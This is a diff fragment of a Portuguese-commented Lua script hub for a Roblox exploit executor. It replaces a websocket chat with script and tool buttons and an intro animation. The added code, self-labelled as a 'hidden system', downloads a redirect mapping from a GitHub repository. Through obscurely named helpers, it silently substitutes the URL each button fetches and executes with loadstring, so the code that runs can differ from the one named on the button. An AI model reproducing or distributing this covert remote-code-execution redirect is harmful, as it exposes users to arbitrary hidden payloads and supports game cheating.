+        local s, d = pcall(function() return game:HttpGet("https://raw.githubusercontent.com/YuMAID369/SPWN-REDIRECT/main/mapping.json") end)
+        if s and d then
+            local s2, j = pcall(function() return game:GetService("HttpService"):JSONDecode(d) end)
+            if s2 and j and j.mapping then
+                for k, v in pairs(j.mapping) do _a[k] = v end
             end
-        end)
+        end
+    end
+end
 
-        socket.OnClose:Connect(function()
-            if running then
-                warn("Conexão interrompida. Tentando reconectar...")
-                task.wait(5)
-                ConnectWebSocket()
+-- ============================================
+-- GERADOR DE BOTÕES (COM SISTEMA OCULTO)
+-- ============================================
+
+-- Página 2 - Scripts
+for name, link in pairs(ScriptData) do
+    local btn = Create("TextButton", PageScripts, {
+        BackgroundColor3 = Color3.fromRGB(35,35,35), 
+        Text = name, 
+        TextColor3 = Color3.fromRGB(255,255,255), 
+        TextSize = 15, 
+        Font = Enum.Font.Arcade, 
+        TextWrapped = true,
+        TextXAlignment = Enum.TextXAlignment.Center,
+        TextYAlignment = Enum.TextYAlignment.Center
+    })
+    Create("UICorner", btn, {CornerRadius = UDim.new(0, 4)})
+    
+    btn.MouseButton1Click:Connect(function()
+        PlayClickSound()
+        _f()
+        local r = _d(name, link)
+        local s, e = pcall(function() loadstring(game:HttpGet(r))() end)
+        if not s then
+            pcall(function() loadstring(game:HttpGet(link))() end)
+        end
+    end)
+end
+
+-- Página 3 - Tools
+for _, data in ipairs(ToolData) do
+    local btn = Create("TextButton", PageTools, {
+        BackgroundColor3 = Color3.fromRGB(45, 45, 45),
+        Text = data.name,
+        TextColor3 = Color3.fromRGB(255, 255, 255),
+        TextSize = 16, 
+        Font = Enum.Font.LuckiestGuy, 
+        TextWrapped = true,
+        TextXAlignment = Enum.TextXAlignment.Center,
+        TextYAlignment = Enum.TextYAlignment.Center
+    })
+    Create("UICorner", btn, {CornerRadius = UDim.new(0, 2)})
+
+    if data.link ~= "" then
+        btn.MouseButton1Click:Connect(function()
+            PlayClickSound()
+            _f()
+            local r = _d(data.name, data.link)
+            local s, e = pcall(function() loadstring(game:HttpGet(r))() end)
+            if not s then
+                pcall(function() loadstring(game:HttpGet(data.link))() end)
             end
         end)
     else
-        if running then
-            warn("Erro de conexão com o novo cluster. Reajustando em 5 segundos...")
-            task.wait(5)
-            ConnectWebSocket()
-        end
+        btn.AutoButtonColor = false
     end
 end
 
--- Botão Enviar
-local function EnviarMensagem()
-    if socket and G2L.Input.Text ~= "" then
-        local success, err = pcall(function()
-            socket:Send(HttpService:JSONEncode({
-                username = Player.Name, 
-                nickname = Player.DisplayName, 
-                message = G2L.Input.Text
-            }))
-        end)
-        if not success then 
-            warn("Falha no envio (Socket morto). Tentando reconectar...")
-            ConnectWebSocket()
-        end
-        G2L.Input.Text = ""
-    elseif not socket then
-        warn("Chat desconectado. Aguarde a reconexão.")
+-- ============================================
+-- LÓGICA DO BOTÃO OPEN
+-- ============================================
+
+local lastClick = 0
+OpenBtn.MouseButton1Click:Connect(function()
+    local currentTime = tick()
+    if (currentTime - lastClick) < 0.35 then 
+        ScreenGui:Destroy() 
+    else 
+        PlayClickSound()
+        MainFrame.Visible = not MainFrame.Visible 
     end
-end
-
-G2L.SendBtn.MouseButton1Click:Connect(EnviarMensagem)
-G2L.Input.FocusLost:Connect(function(enter) if enter then EnviarMensagem() end end)
-
--- FUNÇÃO DE ARRASTE
-local function MakeDraggable(gui)
-    local dragging, dragInput, dragStart, startPos
-    gui.InputBegan:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
-            dragging = true
-            dragStart = input.Position
-            startPos = gui.Position
-            input.Changed:Connect(function()
-                if input.UserInputState == Enum.UserInputState.End then dragging = false end
-            end)
-        end
-    end)
-    gui.InputChanged:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-            dragInput = input
-        end
-    end)
-    UserInputService.InputChanged:Connect(function(input)
-        if input == dragInput and dragging then
-            local delta = input.Position - dragStart
-            gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-        end
-    end)
-end
-
-MakeDraggable(G2L.Main)
-MakeDraggable(G2L.ToggleButton)
-
-G2L.ToggleButton.MouseButton1Click:Connect(function() 
-    G2L.Main.Visible = not G2L.Main.Visible 
-    if G2L.Main.Visible then
-        G2L.ToggleButton.Image = ID_NORMAL
-    end
+    lastClick = currentTime
 end)
 
--- Ação do Botão de Fechar
-G2L.CloseBtn.MouseButton1Click:Connect(function()
-    running = false
-    getgenv().custom_chat_loaded = nil
-    if socket then
-        pcall(function() socket:Close() end)
-    end
-    G2L.ScreenGui:Destroy()
-    print("Script de Chat Encerrado Definitivamente.")
+-- ============================================
+-- INTRO ANIMATION
+-- ============================================
+
+task.spawn(function()
+    task.wait(0.1)
+    local infoE, infoB, infoI, infoD = TweenInfo.new(1.3, Enum.EasingStyle.Exponential, Enum.EasingDirection.Out), TweenInfo.new(1.8, Enum.EasingStyle.Quint, Enum.EasingDirection.InOut), TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In), TweenInfo.new(0.5, Enum.EasingStyle.Quad, Enum.EasingDirection.In)
+
+    TweenService:Create(IconImage, infoE, {Position = UDim2.new(0.5, 0, 0.5, 0), ImageTransparency = 0}):Play()
+    TweenService:Create(IconImage, infoE, {Rotation = 720}):Play()
+    TweenService:Create(Background, infoB, {BackgroundTransparency = 0.20}):Play()
+
+    task.wait(1.2)
+    local fix = TweenService:Create(IconImage, infoI, {Size = UDim2.new(0, 260, 0, 260), Rotation = 0}); fix:Play(); fix.Completed:Wait()
+    task.wait(1.5)
+
+    TweenService:Create(Background, infoD, {BackgroundTransparency = 1}):Play()
+    local dissipate = TweenService:Create(IconImage, infoD, {Size = UDim2.new(0, 400, 0, 400), ImageTransparency = 1}); dissipate:Play()
+    TweenService:Create(OpenBtn, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {ImageTransparency = 0}):Play()
+
+    dissipate.Completed:Wait()
+    IntroGui:Destroy()
 end)
-
-task.spawn(ConnectWebSocket)
-
-G2L.Layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
-    G2L.ChatHistory.CanvasSize = UDim2.new(0, 0, 0, G2L.Layout.AbsoluteContentSize.Y + 10)
-end)
-
-return G2L.ScreenGui
